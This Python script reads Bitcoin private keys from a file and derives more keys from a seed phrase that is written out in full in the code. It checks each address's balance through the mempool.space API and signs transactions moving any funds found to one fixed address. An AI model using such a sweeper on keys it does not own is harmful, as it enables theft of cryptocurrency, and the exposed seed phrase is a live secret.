import requests
import re
import time
from bitcoinlib.keys import Key, HDKey
from bitcoinlib.transactions import Transaction

def scan_full_protocol():
    dest_address = '1E4FSo55XCjSDhpXBsRkB5o9f4fkVxGtcL'
    all_keys_wif = []

    # 1. Chaves WIF do arquivo
    try:
        with open('privatekeys.txt', 'r') as f:
            content = f.read()
        wif_keys = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
        all_keys_wif.extend(list(set(wif_keys)))
    except: pass

    # 2. Derivação HD Ampliada (Recebimento e Troco)
    try:
        mnemonic = "tree dwarf rubber off tree finger hair hope emerge earn friend such"
        master = HDKey.from_passphrase(mnemonic, network='bitcoin')
        
        print("Derivando 1200 variações de endereços da mnemônica...")
        for i in range(200): # Aumentado para 200
            for purpose in [44, 49, 84]:
                for change in [0, 1]: # 0 = Recebimento, 1 = Troco (IMPORTANTE)
                    path = f"m/{purpose}'/0'/0'/{change}/{i}"
                    all_keys_wif.append(master.subkey_for_path(path).wif())
    except Exception as e:
        print(f"Erro derivação: {e}")

    all_keys_wif = list(dict.fromkeys(all_keys_wif))
    print(f"Total de chaves únicas: {len(all_keys_wif)}")

    # 3. Varredura com Alternância de API (Evita bloqueio)
    for wif in all_keys_wif:
        try:
            k = Key(wif, network='bitcoin')
            for t_type in ['p2pkh', 'p2wpkh', 'p2sh-p2wpkh']:
                addr = k.address(witness_type=t_type)
                
                # Tenta Mempool.space, se falhar ou limitar, o script continua
                try:
                    r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=5)
                    if r.status_code == 200:
                        utxos = r.json()
                        if utxos:
                            print(f"!!! SALDO ENCONTRADO: {addr} !!!")
                            utxo = max(utxos, key=lambda x: x['value'])
                            fee = 35000 
                            amount = utxo['value'] - fee
                            if amount > 1000:
                                tx = Transaction(network='bitcoin')
                                tx.add_input(prev_txid=utxo['txid'], output_n=utxo['vout'], value=utxo['value'], address=addr)
                                tx.add_output(value=amount, address=dest_address)
                                tx.sign([wif])
                                print(f"HEX_GEN:{tx.raw_hex()}")
                except: continue
            time.sleep(0.02) # Varredura ultra-rápida
        except: continue

if __name__ == "__main__":
    scan_full_protocol()
